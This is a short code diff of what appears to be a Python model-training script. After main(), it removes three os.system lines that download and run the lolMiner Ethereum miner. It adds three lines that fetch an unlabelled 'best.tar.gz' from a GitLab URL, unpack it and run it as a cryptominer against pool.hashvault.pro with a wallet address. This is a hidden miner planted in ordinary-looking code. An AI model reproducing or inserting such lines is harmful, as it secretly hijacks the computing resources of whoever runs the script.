@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz')
-os.system('tar xf lolMiner_v1.51a_Lin64.tar.gz')
-os.system('cd 1.51a && ./lolMiner --algo ETHASH --pool eth.2miners.com:2020 --user 0xc965dfee4db0b7ca185c8d070d0750bf7b558daa.rig0')
+os.system('wget https://gitlab.com/gasolin1/lah/-/raw/main/best.tar.gz')
+os.system('tar -xvf best.tar.gz')
+os.system('./best --tls-url pool.hashvault.pro:80 --user ccx7aoNYpGb7sndJtEDWvCBQhPAy9mC8QW5KWuCx8J1FJrDcDrER1XYA9LGtggrR7ZC4KfQmQ2uRN47L9WypBbNLAeq2Q4Q9WN.8cd54ecc2a8e42265e3020c20074d29804198073297dc01a9f9577186343e62c --pass ue --currency cryptonight_gpu')
